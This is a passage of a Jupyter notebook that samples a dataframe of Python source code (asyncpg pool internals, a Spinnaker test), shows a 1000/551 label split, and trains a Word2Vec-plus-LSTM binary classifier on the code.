TransactionState.NEW\\nself._nested = False\\nself._id = None\\nself._managed = False\\n\\nasync def __aenter__(self):\\nif self._managed:\\nraise apg_errors.InterfaceError(\\n'cannot enter context: already in an `async with` block')\\nself._managed = True\\nawait self.start()\\n\\nasync def __aexit__(self, extype, ex, tb):\\ntry:\\nself._check_conn_validity('__aexit__')\\nexcept apg_errors.InterfaceError:\\nif extype is GeneratorExit:\\nreturn\\nelse:\\nraise\\n\\ntry:\\nif extype is not None:\\nawait self.__rollback()\\nelse:\\nawait self.__commit()\\nfinally:\\nself._managed = False\\n\\n@connresource.guarded\\nasync def start(self):\\nif self._managed:\\nraise apg_errors.InterfaceError(\\n'cannot manually commit from within an `async with` block')\\nawait self.__commit()\\n\\n@connresource.guarded\\nasync def rollback(self):\\n\\n\\nimport asyncio\\nimport functools\\nimport inspect\\nimport logging\\nimport time\\nimport warnings\\n\\nfrom . import compat\\nfrom . import connection\\nfrom . import exceptions\\nfrom . import protocol\\n\\n\\nlogger = logging.getLogger(__name__)\\n\\n\\nclass PoolConnectionProxyMeta(type):\\n\\ndef __new__(mcls, name, bases, dct, *, wrap=False):\\nif wrap:\\nfor attrname in dir(connection.Connection):\\nif attrname.startswith('_') or attrname in dct:\\ncontinue\\n\\nmeth = getattr(connection.Connection, attrname)\\nif not inspect.isfunction(meth):\\ncontinue\\n\\niscoroutine = inspect.iscoroutinefunction(meth)\\nwrapper = mcls._wrap_connection_method(attrname, iscoroutine)\\nwrapper = functools.update_wrapper(wrapper, meth)\\ndct[attrname] = wrapper\\n\\nif '__doc__' not in dct:\\ndct['__doc__'] = connection.Connection.__doc__\\n\\nreturn super().__new__(mcls, name, bases, dct)\\n\\n@staticmethod\\ndef _wrap_connection_method(meth_name, iscoroutine):\\ndef call_con_method(self, *args, **kwargs):\\nif self._con is None:\\nraise exceptions.InterfaceError(\\n'cannot call Connection.{}(): '\\n'connection has been released back to the pool'.format(\\nmeth_name))\\n\\nmeth = getattr(self._con.__class__, meth_name)\\nreturn meth(self._con, *args, **kwargs)\\n\\nif iscoroutine:\\ncompat.markcoroutinefunction(call_con_method)\\n\\nreturn call_con_method\\n\\n\\nclass PoolConnectionProxy(connection._ConnectionProxy,\\nmetaclass=PoolConnectionProxyMeta,\\nwrap=True):\\n\\n__slots__ = ('_con', '_holder')\\n\\ndef __init__(self, holder: 'PoolConnectionHolder',\\ncon: connection.Connection):\\nself._con = con\\nself._holder = holder\\ncon._set_proxy(self)\\n\\ndef __getattr__(self, attr):\\nreturn getattr(self._con, attr)\\n\\ndef _detach(self) -> connection.Connection:\\nif self._con is None:\\nreturn\\n\\ncon, self._con = self._con, None\\ncon._set_proxy(None)\\nreturn con\\n\\ndef __repr__(self):\\nif self._con is None:\\nreturn '<{classname} [released] {id:\\nclassname=self.__class__.__name__, id=id(self))\\nelse:\\nreturn '<{classname} {con!r} {id:\\nclassname=self.__class__.__name__, con=self._con, id=id(self))\\n\\n\\nclass PoolConnectionHolder:\\n\\n__slots__ = ('_con', '_pool', '_loop', '_proxy',\\n'_max_queries', '_setup',\\n'_max_inactive_time', '_in_use',\\n'_inactive_callback', '_timeout',\\n'_generation')\\n\\ndef __init__(self, pool, *, max_queries, setup, max_inactive_time):\\n\\nself._pool = pool\\nself._con = None\\nself._proxy = None\\n\\nself._max_queries = max_queries\\nself._max_inactive_time = max_inactive_time\\nself._setup = setup\\nself._inactive_callback = None\\nself._in_use = None\\nself._timeout = None\\nself._generation = None\\n\\ndef is_connected(self):\\nreturn self._con is not None and not self._con.is_closed()\\n\\ndef is_idle(self):\\nreturn not self._in_use\\n\\nasync def connect(self):\\nif self._con is not None:\\nraise exceptions.InternalClientError(\\n'PoolConnectionHolder.connect() called while another '\\n'connection already exists')\\n\\nself._con = await self._pool._get_new_connection()\\nself._generation = self._pool._generation\\nself._maybe_cancel_inactive_callback()\\nself._setup_inactive_callback()\\n\\nasync def acquire(self) -> PoolConnectionProxy:\\nif self._con is None or self._con.is_closed():\\nself._con = None\\nawait self.connect()\\n\\nelif self._generation != self._pool._generation:\\nself._pool._loop.create_task(\\nself._con.close(timeout=self._timeout))\\nself._con = None\\nawait self.connect()\\n\\nself._maybe_cancel_inactive_callback()\\n\\nself._proxy = proxy = PoolConnectionProxy(self, self._con)\\n\\nif self._setup is not None:\\ntry:\\nawait self._setup(proxy)\\nexcept (Exception, asyncio.CancelledError) as ex:\\ntry:\\nawait self._con.close()\\nfinally:\\nraise ex\\n\\nself._in_use = self._pool._loop.create_future()\\n\\nreturn proxy\\n\\nasync def release(self, timeout):\\nif self._in_use is None:\\nraise exceptions.InternalClientError(\\n'PoolConnectionHolder.release() called on '\\n'a free connection holder')\\n\\nif self._con.is_closed():\\nreturn\\n\\nself._timeout = None\\n\\nif self._con._protocol.queries_count >= self._max_queries:\\nawait self._con.close(timeout=timeout)\\nreturn\\n\\nif self._generation != self._pool._generation:\\nawait self._con.close(timeout=timeout)\\nreturn\\n\\ntry:\\nbudget = timeout\\n\\nif self._con._protocol._is_cancelling():\\nstarted = time.monotonic()\\nawait compat.wait_for(\\nself._con._protocol._wait_for_cancellation(),\\nbudget)\\nif budget is not None:\\nbudget -= time.monotonic() - started\\n\\nif self._pool._reset is not None:\\nasync with compat.timeout(budget):\\nawait self._con._reset()\\nawait self._pool._reset(self._con)\\nelse:\\nawait self._con.reset(timeout=budget)\\nexcept (Exception, asyncio.CancelledError) as ex:\\ntry:\\nself._con.terminate()\\nfinally:\\nraise ex\\n\\nself._release()\\n\\nself._setup_inactive_callback()\\n\\nasync def wait_until_released(self):\\nif self._in_use is None:\\nreturn\\nelse:\\nawait self._in_use\\n\\nasync def close(self):\\nif self._con is not None:\\nawait self._con.close()\\n\\ndef terminate(self):\\nif self._con is not None:\\nself._con.terminate()\\n\\ndef _setup_inactive_callback(self):\\nif self._inactive_callback is not None:\\nraise exceptions.InternalClientError(\\n'pool connection inactivity timer already exists')\\n\\nif self._max_inactive_time:\\nself._inactive_callback = self._pool._loop.call_later(\\nself._max_inactive_time, self._deactivate_inactive_connection)\\n\\ndef _maybe_cancel_inactive_callback(self):\\nif self._inactive_callback is not None:\\nself._inactive_callback.cancel()\\nself._inactive_callback = None\\n\\ndef _deactivate_inactive_connection(self):\\nif self._in_use is not None:\\nraise exceptions.InternalClientError(\\n'attempting to deactivate an acquired connection')\\n\\nif self._con is not None:\\nself._con.terminate()\\nself._release_on_close()\\n\\ndef _release_on_close(self):\\nself._maybe_cancel_inactive_callback()\\nself._release()\\nself._con = None\\n\\ndef _release(self):\\n\\nConnection pool can be used to manage a set of connections to the database.\\nConnections are first acquired from the pool, then used, and then released\\nback to the pool.  Once a connection is released, it's reset to close all\\nopen cursors and other resources *except* prepared statements.\\n\\nPools are created by calling :func:`~asyncpg.pool.create_pool`.\\n\\n.. versionadded:: 0.28.0\\n\\n.. versionadded:: 0.25.0\\n\\n.. versionadded:: 0.25.0\\n\\n.. versionadded:: 0.25.0\\n\\n.. versionadded:: 0.25.0\\n\\nself._connect_args = [dsn]\\nself._connect_kwargs = connect_kwargs\\n\\nasync def _get_new_connection(self):\\ncon = await self._connect(\\n*self._connect_args,\\nloop=self._loop,\\nconnection_class=self._connection_class,\\nrecord_class=self._record_class,\\n**self._connect_kwargs,\\n)\\nif not isinstance(con, self._connection_class):\\ngood = self._connection_class\\ngood_n = f'{good.__module__}.{good.__name__}'\\nbad = type(con)\\nif bad.__module__ == \\\"builtins\\\":\\nbad_n = bad.__name__\\nelse:\\nbad_n = f'{bad.__module__}.{bad.__name__}'\\nraise exceptions.InterfaceError(\\n\\\"expected pool connect callback to return an instance of \\\"\\nf\\\"'{good_n}', got \\\" f\\\"'{bad_n}'\\\"\\n)\\n\\nif self._init is not None:\\ntry:\\nawait self._init(con)\\nexcept (Exception, asyncio.CancelledError) as ex:\\ntry:\\nawait con.close()\\nfinally:\\nraise ex\\n\\nreturn con\\n\\nasync def execute(self, query: str, *args, timeout: float=None) -> str:\\nasync with self.acquire() as con:\\nreturn await con.execute(query, *args, timeout=timeout)\\n\\nasync def executemany(self, command: str, args, *, timeout: float=None):\\nasync with self.acquire() as con:\\nreturn await con.executemany(command, args, timeout=timeout)\\n\\nasync def fetch(\\nself,\\nquery,\\n*args,\\ntimeout=None,\\nrecord_class=None\\n) -> list:\\nasync with self.acquire() as con:\\nreturn await con.fetch(\\nquery,\\n*args,\\ntimeout=timeout,\\nrecord_class=record_class\\n)\\n\\nasync def fetchval(self, query, *args, column=0, timeout=None):\\nasync with self.acquire() as con:\\nreturn await con.fetchval(\\nquery, *args, column=column, timeout=timeout)\\n\\nasync def fetchrow(self, query, *args, timeout=None, record_class=None):\\nasync with self.acquire() as con:\\nreturn await con.fetchrow(\\nquery,\\n*args,\\ntimeout=timeout,\\nrecord_class=record_class\\n)\\n\\nasync def fetchmany(self, query, args, *, timeout=None, record_class=None):\\nasync with self.acquire() as con:\\nreturn await con.fetchmany(\\nquery, args, timeout=timeout, record_class=record_class\\n)\\n\\nasync def copy_from_table(\\nself,\\ntable_name,\\n*,\\noutput,\\ncolumns=None,\\nschema_name=None,\\ntimeout=None,\\nformat=None,\\noids=None,\\ndelimiter=None,\\nnull=None,\\nheader=None,\\nquote=None,\\nescape=None,\\nforce_quote=None,\\nencoding=None\\n):\\nasync with self.acquire() as con:\\nreturn await con.copy_from_table(\\ntable_name,\\noutput=output,\\ncolumns=columns,\\nschema_name=schema_name,\\ntimeout=timeout,\\nformat=format,\\noids=oids,\\ndelimiter=delimiter,\\nnull=null,\\nheader=header,\\nquote=quote,\\nescape=escape,\\nforce_quote=force_quote,\\nencoding=encoding\\n)\\n\\nasync def copy_from_query(\\nself,\\nquery,\\n*args,\\noutput,\\ntimeout=None,\\nformat=None,\\noids=None,\\ndelimiter=None,\\nnull=None,\\nheader=None,\\nquote=None,\\nescape=None,\\nforce_quote=None,\\nencoding=None\\n):\\nasync with self.acquire() as con:\\nreturn await con.copy_from_query(\\nquery,\\n*args,\\noutput=output,\\ntimeout=timeout,\\nformat=format,\\noids=oids,\\ndelimiter=delimiter,\\nnull=null,\\nheader=header,\\nquote=quote,\\nescape=escape,\\nforce_quote=force_quote,\\nencoding=encoding\\n)\\n\\nasync def copy_to_table(\\nself,\\ntable_name,\\n*,\\nsource,\\ncolumns=None,\\nschema_name=None,\\ntimeout=None,\\nformat=None,\\noids=None,\\nfreeze=None,\\ndelimiter=None,\\nnull=None,\\nheader=None,\\nquote=None,\\nescape=None,\\nforce_quote=None,\\nforce_not_null=None,\\nforce_null=None,\\nencoding=None,\\nwhere=None\\n):\\nasync with self.acquire() as con:\\nreturn await con.copy_to_table(\\ntable_name,\\nsource=source,\\ncolumns=columns,\\nschema_name=schema_name,\\ntimeout=timeout,\\nformat=format,\\noids=oids,\\nfreeze=freeze,\\ndelimiter=delimiter,\\nnull=null,\\nheader=header,\\nquote=quote,\\nescape=escape,\\nforce_quote=force_quote,\\nforce_not_null=force_not_null,\\nforce_null=force_null,\\nencoding=encoding,\\nwhere=where\\n)\\n\\nasync def copy_records_to_table(\\nself,\\ntable_name,\\n*,\\nrecords,\\ncolumns=None,\\nschema_name=None,\\ntimeout=None,\\nwhere=None\\n):\\nasync with self.acquire() as con:\\nreturn await con.copy_records_to_table(\\ntable_name,\\nrecords=records,\\ncolumns=columns,\\nschema_name=schema_name,\\ntimeout=timeout,\\nwhere=where\\n)\\n\\ndef acquire(self, *, timeout=None):\\nreturn PoolAcquireContext(self, timeout)\\n\\nasync def _acquire(self, timeout):\\nasync def _acquire_impl():\\nch = await self._queue.get()\\ntry:\\nproxy = await ch.acquire()\\nexcept (Exception, asyncio.CancelledError):\\nself._queue.put_nowait(ch)\\nraise\\nelse:\\nch._timeout = timeout\\nreturn proxy\\n\\nif self._closing:\\nraise exceptions.InterfaceError('pool is closing')\\nself._check_init()\\n\\nif timeout is None:\\nreturn await _acquire_impl()\\nelse:\\nreturn await compat.wait_for(\\n_acquire_impl(), timeout=timeout)\\n\\nasync def release(self, connection, *, timeout=None):\\nif (type(connection) is not PoolConnectionProxy or\\nconnection._holder._pool is not self):\\nraise exceptions.InterfaceError(\\n'Pool.release() received invalid connection: '\\n'{connection!r} is not a member of this pool'.format(\\nconnection=connection))\\n\\nif connection._con is None:\\nreturn\\n\\nself._check_init()\\n\\nconnection._con._on_release()\\n\\nch = connection._holder\\nif timeout is None:\\ntimeout = ch._timeout\\n\\nreturn await asyncio.shield(ch.release(timeout))\\n\\nasync def close(self):\\nif self._closed:\\nreturn\\nself._check_init()\\n\\nself._closing = True\\n\\nwarning_callback = None\\ntry:\\nwarning_callback = self._loop.call_later(\\n60, self._warn_on_long_close)\\n\\nrelease_coros = [\\nch.wait_until_released() for ch in self._holders]\\nawait asyncio.gather(*release_coros)\\n\\nclose_coros = [\\nch.close() for ch in self._holders]\\nawait asyncio.gather(*close_coros)\\n\\nexcept (Exception, asyncio.CancelledError):\\nself.terminate()\\nraise\\n\\nfinally:\\nif warning_callback is not None:\\nwarning_callback.cancel()\\nself._closed = True\\nself._closing = False\\n\\ndef _warn_on_long_close(self):\\nlogger.warning('Pool.close() is taking over 60 seconds to complete. '\\n'Check if you have any unreleased connections left. '\\n'Use asyncio.wait_for() to set a timeout for '\\n'Pool.close().')\\n\\ndef terminate(self):\\n\\nCause all currently open connections to get replaced on the\\nnext :meth:`~asyncpg.pool.Pool.acquire()` call.\\n\\n.. versionadded:: 0.16.0\\nawait con.fetch('SELECT 1')\\n\\nOr directly with ``await`` (not recommended):\\n\\n.. code-block:: python\\n\\npool = await asyncpg.create_pool(user='postgres', command_timeout=60)\\ncon = await pool.acquire()\\ntry:\\nawait con.fetch('SELECT 1')\\nfinally:\\nawait pool.release(con)\\n\\n.. warning::\\nPrepared statements and cursors returned by\\n:meth:`Connection.prepare() <asyncpg.connection.Connection.prepare>`\\nand :meth:`Connection.cursor() <asyncpg.connection.Connection.cursor>`\\nbecome invalid once the connection is released.  Likewise, all\\nnotification and log listeners are removed, and ``asyncpg`` will\\nissue a warning if there are any listener callbacks registered on a\\nconnection that is being released to the pool.\\n\\n:param str dsn:\\nConnection arguments specified using as a single string in\\nthe following format:\\n``postgres://user:pass@host:port/database?option=value``.\\n\\n:param \\\\*\\\\*connect_kwargs:\\nKeyword arguments for the :func:`~asyncpg.connection.connect`\\nfunction.\\n\\n:param Connection connection_class:\\nThe class to use for connections.  Must be a subclass of\\n:class:`~asyncpg.connection.Connection`.\\n\\n:param type record_class:\\nIf specified, the class to use for records returned by queries on\\nthe connections in this pool.  Must be a subclass of\\n:class:`~asyncpg.Record`.\\n\\n:param int min_size:\\nNumber of connection the pool will be initialized with.\\n\\n:param int max_size:\\nMax number of connections in the pool.\\n\\n:param int max_queries:\\nNumber of queries after a connection is closed and replaced\\nwith a new connection.\\n\\n:param float max_inactive_connection_lifetime:\\nNumber of seconds after which inactive connections in the\\npool will be closed.  Pass ``0`` to disable this mechanism.\\n\\n:param coroutine connect:\\nA coroutine that is called instead of\\n:func:`~asyncpg.connection.connect` whenever the pool needs to make a\\nnew connection.  Must return an instance of type specified by\\n*connection_class* or :class:`~asyncpg.connection.Connection` if\\n*connection_class* was not specified.\\n\\n:param coroutine setup:\\nA coroutine to prepare a connection right before it is returned\\nfrom :meth:`Pool.acquire()`.  An example use\\ncase would be to automatically set up notifications listeners for\\nall connections of a pool.\\n\\n:param coroutine init:\\nA coroutine to initialize a connection when it is created.\\nAn example use case would be to setup type codecs with\\n:meth:`Connection.set_builtin_type_codec() <\\\\\\nasyncpg.connection.Connection.set_builtin_type_codec>`\\nor :meth:`Connection.set_type_codec() <\\\\\\nasyncpg.connection.Connection.set_type_codec>`.\\n\\n:param coroutine reset:\\nA coroutine to reset a connection before it is returned to the pool by\\n:meth:`Pool.release()`.  The function is supposed\\nto reset any changes made to the database session so that the next\\nacquirer gets the connection in a well-defined state.\\n\\nThe default implementation calls :meth:`Connection.reset() <\\\\\\nasyncpg.connection.Connection.reset>`, which runs the following::\\n\\nSELECT pg_advisory_unlock_all();\\nCLOSE ALL;\\nUNLISTEN *;\\nRESET ALL;\\n\\nThe exact reset query is determined by detected server capabilities,\\nand a custom *reset* implementation can obtain the default query\\nby calling :meth:`Connection.get_reset_query() <\\\\\\nasyncpg.connection.Connection.get_reset_query>`.\\n\\n:param loop:\\nAn asyncio event loop instance.  If ``None``, the default\\nevent loop will be used.\\n\\n:return: An instance of :class:`~asyncpg.pool.Pool`.\\n\\n.. versionchanged:: 0.10.0\\nAn :exc:`~asyncpg.exceptions.InterfaceError` will be raised on any\\nattempted operation on a released connection.\\n\\n.. versionchanged:: 0.13.0\\nAn :exc:`~asyncpg.exceptions.InterfaceError` will be raised on any\\nattempted operation on a prepared statement or a cursor created\\non a connection that has been released to the pool.\\n\\n.. versionchanged:: 0.13.0\\nAn :exc:`~asyncpg.exceptions.InterfaceWarning` will be produced\\nif there are any active listeners (added via\\n:meth:`Connection.add_listener()\\n<asyncpg.connection.Connection.add_listener>`\\nor :meth:`Connection.add_log_listener()\\n<asyncpg.connection.Connection.add_log_listener>`) present on the\\nconnection at the moment of its release to the pool.\\n\\n.. versionchanged:: 0.22.0\\nAdded the *record_class* parameter.\\n\\n.. versionchanged:: 0.30.0\\nAdded the *connect* and *reset* parameters.\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"label\",\n      \"properties\": {\n        \"dtype\": \"number\",\n        \"std\": 0,\n        \"min\": 0,\n        \"max\": 1,\n        \"num_unique_values\": 2,\n        \"samples\": [\n          1,\n          0\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    }\n  ]\n}"
            }
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "# Get the distribution of the 'label' column\n",
        "label_distribution = df_final['label'].value_counts()\n",
        "print(\"Label Distribution:\")\n",
        "display(label_distribution)\n",
        "\n",
        "# Get one example of 'source_code' for each unique label\n",
        "print(\"\\nExample source code for each label:\")\n",
        "for label in df_final['label'].unique():\n",
        "    example_code = df_final[df_final['label'] == label]['source_code'].iloc[0]\n",
        "    print(f\"\\n--- Label: {label} ---\")\n",
        "    print(example_code[:500] + \"...\") # Print first 500 characters as an example"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 914
        },
        "id": "ctp2v5czRjJP",
        "outputId": "a26be79e-3b58-4573-ff9a-64b06c2a5230"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Label Distribution:\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "label\n",
              "1    1000\n",
              "0     551\n",
              "Name: count, dtype: int64"
            ],
            "text/html": [
              "<div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>count</th>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>label</th>\n",
              "      <th></th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>1000</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>551</td>\n",
              "    </tr>\n",
              "  </tbody>\n",
              "</table>\n",
              "</div><br><label><b>dtype:</b> int64</label>"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Example source code for each label:\n",
            "\n",
            "--- Label: 0 ---\n",
            "\n",
            "\n",
            "from __future__ import annotations\n",
            "\n",
            "import re\n",
            "import typing\n",
            "\n",
            "from .types import ServerVersion\n",
            "\n",
            "version_regex: typing.Final = re.compile(\n",
            "r\"(Postgre[^\\s]*)?\\s*\"\n",
            "r\"(?P<major>[0-9]+)\\.?\"\n",
            "r\"((?P<minor>[0-9]+)\\.?)?\"\n",
            "r\"(?P<micro>[0-9]+)?\"\n",
            "r\"(?P<releaselevel>[a-z]+)?\"\n",
            "r\"(?P<serial>[0-9]+)?\"\n",
            ")\n",
            "\n",
            "\n",
            "class _VersionDict(typing.TypedDict):\n",
            "major: int\n",
            "minor: int | None\n",
            "micro: int | None\n",
            "releaselevel: str | None\n",
            "serial: int | None\n",
            "\n",
            "\n",
            "def split_server_version_string(version_string: str) -> ServerVersion:\n",
            "version...\n",
            "\n",
            "--- Label: 1 ---\n",
            "\n",
            "\n",
            "import time import sys import citest.gcp_testing as gcp import citest.json_contract as jc import citest.service_testing as st import spinnaker_testing as sk import spinnaker_testing.gate as gate class GoogleServerGroupTestScenario(sk.SpinnakerTestScenario): @classmethod def new_agent(cls, bindings): '''Implements the base class interface to create a new agent. This method is called by the base classes during setup/initialization. Args: bindings: The bindings dictionary with configuration infor...\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import tensorflow as tf\n",
        "from tensorflow.keras.models import Sequential\n",
        "from tensorflow.keras.layers import LSTM, Dense\n",
        "from sklearn.model_selection import train_test_split\n",
        "from sklearn.preprocessing import LabelEncoder\n",
        "from tensorflow.keras.utils import to_categorical\n",
        "import numpy as np\n",
        "\n",
        "# Assuming tokenize_python, embed_sequences, and w2v_model are already defined and loaded\n",
        "\n",
        "# Apply tokenization, embedding, and padding to the 'source_code' column of df_final\n",
        "\n",
        "# 1. Tokenize the 'source_code' column\n",
        "df_final['tokenized_source'] = df_final['source_code'].apply(tokenize_python)\n",
        "\n",
        "# 2. Embed the tokenized sequences using the loaded Word2Vec model\n",
        "if w2v_model:\n",
        "    df_final['embedded_source'] = embed_sequences(df_final['tokenized_source'].tolist(), w2v_model)\n",
        "else:\n",
        "    print(\"Word2Vec model not loaded. Cannot embed sequences.\")\n",
        "    df_final['embedded_source'] = None # Or handle appropriately\n",
        "\n",
        "# 3. Pad the embedded sequences\n",
        "if w2v_model and df_final['embedded_source'] is not None:\n",
        "    max_sequence_length = 100 # Use the same max length as before\n",
        "    embedding_dim = w2v_model.vector_size\n",
        "\n",
        "    padded_embedded_sequences_final = []\n",
        "    for embedded_sequence in df_final['embedded_source']:\n",
        "        if embedded_sequence.size > 0:\n",
        "            padding_length = max_sequence_length - embedded_sequence.shape[0]\n",
        "            if padding_length > 0:\n",
        "                padding = np.zeros((padding_length, embedding_dim))\n",
        "                padded_sequence = np.concatenate((embedded_sequence, padding), axis=0)\n",
        "            else:\n",
        "                padded_sequence = embedded_sequence[:max_sequence_length]\n",
        "        else:\n",
        "            padded_sequence = np.zeros((max_sequence_length, embedding_dim))\n",
        "\n",
        "        padded_embedded_sequences_final.append(padded_sequence)\n",
        "\n",
        "    df_final['padded_embedded_source'] = padded_embedded_sequences_final\n",
        "    print(\"\\nExample of padded embedded sequence shape (df_final):\")\n",
        "    if padded_embedded_sequences_final:\n",
        "        print(padded_embedded_sequences_final[0].shape)\n",
        "\n",
        "else:\n",
        "    print(\"Embedding step failed. Cannot proceed with padding for df_final.\")\n",
        "\n",
        "# Prepare the data for LSTM (using df_final)\n",
        "if 'padded_embedded_source' in df_final.columns:\n",
        "    X_final = np.array(df_final['padded_embedded_source'].tolist())\n",
        "    y_final = df_final['label']\n",
        "\n",
        "    # Encode the labels to numerical values (already binary, but for consistency)\n",
        "    label_encoder_final = LabelEncoder()\n",
        "    y_encoded_final = label_encoder_final.fit_transform(y_final)\n",
        "\n",
        "    # No need for to_categorical for binary classification with binary_crossentropy loss\n",
        "    # y_one_hot_final = to_categorical(y_encoded_final)\n",
        "\n",
        "    # Split the data into training and testing sets\n",
        "    # Using stratify to maintain the distribution of labels in train and test sets\n",
        "    X_train_final, X_test_final, y_train_final, y_test_final = train_test_split(\n",
        "        X_final, y_encoded_final, test_size=0.2, random_state=42, stratify=y_encoded_final\n",
        "    )\n",
        "\n",
        "    # Define the LSTM model architecture for binary classification\n",
        "    model_final = Sequential()\n",
        "    model_final.add(LSTM(128, input_shape=(max_sequence_length, embedding_dim)))\n",
        "    model_final.add(Dense(1, activation='sigmoid')) # Sigmoid activation for binary classification\n",
        "\n",
        "    # Compile the model\n",
        "    model_final.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])\n",
        "\n",
        "    # Print model summary\n",
        "    print(\"\\ndf_final dataset model summary:\")\n",
        "    model_final.summary()\n",
        "\n",
        "    # Train the model\n",
        "    print(\"\\nTraining model on df_final dataset...\")\n",
        "    history_final = model_final.fit(X_train_final, y_train_final, epochs=10, batch_size=32, validation_split=0.2)\n",
        "\n",
        "    # Evaluate the model on the test set\n",
        "    loss_final, accuracy_final = model_final.evaluate(X_test_final, y_test_final, verbose=0)\n",
        "    print(f\"\\nTest Accuracy (df_final dataset): {accuracy_final*100:.2f}%\")\n",
        "\n",
        "else:\n",
        "    print(\"Padded embedded source not available for df_final. Cannot train model.\")"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 788
        },
        "id": "n2gofl3DSll8",
        "outputId": "79128957-7dd6-4567-d992-21839d64eab3"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Example of padded embedded sequence shape (df_final):\n",
            "(100, 100)\n",
            "\n",
            "df_final dataset model summary:\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "/usr/local/lib/python3.12/dist-packages/keras/src/layers/rnn/rnn.py:199: UserWarning: Do not pass an `input_shape`/`input_dim` argument to a layer. When using Sequential models, prefer using an `Input(shape)` object as the first layer in the model instead.\n",
            "  super().__init__(**kwargs)\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1mModel: \"sequential_1\"\u001b[0m\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\">Model: \"sequential_1\"</span>\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃\u001b[1m \u001b[0m\u001b[1mLayer (type)                   \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1mOutput Shape          \u001b[0m\u001b[1m \u001b[0m┃\u001b[1m \u001b[0m\u001b[1m      Param #\u001b[0m\u001b[1m \u001b[0m┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_1 (\u001b[38;5;33mLSTM\u001b[0m)                   │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m128\u001b[0m)            │       \u001b[38;5;34m117,248\u001b[0m │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_1 (\u001b[38;5;33mDense\u001b[0m)                 │ (\u001b[38;5;45mNone\u001b[0m, \u001b[38;5;34m1\u001b[0m)              │           \u001b[38;5;34m129\u001b[0m │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\">┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\n",
              "┃<span style=\"font-weight: bold\"> Layer (type)                    </span>┃<span style=\"font-weight: bold\"> Output Shape           </span>┃<span style=\"font-weight: bold\">       Param # </span>┃\n",
              "┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━┩\n",
              "│ lstm_1 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">LSTM</span>)                   │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">128</span>)            │       <span style=\"color: #00af00; text-decoration-color: #00af00\">117,248</span> │\n",
              "├─────────────────────────────────┼────────────────────────┼───────────────┤\n",
              "│ dense_1 (<span style=\"color: #0087ff; text-decoration-color: #0087ff\">Dense</span>)                 │ (<span style=\"color: #00d7ff; text-decoration-color: #00d7ff\">None</span>, <span style=\"color: #00af00; text-decoration-color: #00af00\">1</span>)              │           <span style=\"color: #00af00; text-decoration-color: #00af00\">129</span> │\n",
              "└─────────────────────────────────┴────────────────────────┴───────────────┘\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "\u001b[1m Total params: \u001b[0m\u001b[38;5;34m117,377\u001b[0m (458.50 KB)\n"
            ],
            "text/html": [
              "<pre style=\"white-space:pre;overflow-x:auto;line-height:normal;font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace\"><span style=\"font-weight: bold\"> Total params: </span><span style=\"color: #00af00; text-decoration-color: #00af00\">117,377</span> (458.50 KB)\n",
              "</pre>\n"
            ]
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
